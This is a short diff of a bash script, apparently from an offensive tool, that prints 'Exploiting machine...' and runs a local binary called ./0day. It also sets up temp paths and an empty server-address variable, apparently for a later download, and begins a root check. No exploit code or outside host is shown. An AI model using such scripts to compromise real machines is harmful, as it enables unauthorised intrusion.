@@ -7,15 +7,17 @@
 # Patrick Hart & Zachery Rayburn
 
 
-function KeepSafe {
 echo -e '\033[1mExploiting machine...\033[0m'
 echo
 
-#--- EXPLOIT THE MACHINE ---#
-./0day
+#--- BUILD VARIABLES ---#
 randomTMP=/tmp$$/
 serverAddress=
 curledFile=/tmp$$/
+
+#--- EXPLOIT ---#
+./0day
+
 
 #--- CHECK FOR ROOT ---#
   if [[ $EUID -ne 0 ]]
